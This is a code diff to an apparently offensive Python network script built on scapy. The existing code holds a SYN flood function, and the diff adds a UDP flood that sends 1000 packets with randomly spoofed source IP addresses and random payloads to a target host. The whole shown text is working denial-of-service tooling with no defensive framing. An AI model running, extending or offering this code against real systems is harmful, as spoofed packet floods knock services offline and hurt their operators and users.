@@ -3,6 +3,7 @@ import socket
 from scapy.all import *
 import random
 import nmap
+import string
 
 def synflood(TARGET,TARGETPORT):
 	PACKETS_TO_SEND = 1000
@@ -17,7 +18,21 @@ def synflood(TARGET,TARGETPORT):
 		tcppacket.dport = TARGETPORT
 		tcppacket.flags = 'S'
 		p1 = ippacket / tcppacket
-		send(p1, verbose=0)		
+		send(p1, verbose=0)
+
+
+def generaterandomstring():
+	return ''.join(random.choice(string.ascii_lowercase) for index in range(random.randint(0,1000)))
+
+def randombyteflooding(TARGET):
+	for index in range(1000):
+		ippacket = IP()
+		ippacket.dst = TARGET
+		ippacket.src = '.'.join(str(random.randint(0,255)) for inner in range(4))
+
+		udppacket = UDP()
+
+		sr(ippacket/udppacket/generaterandomstring())
 
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
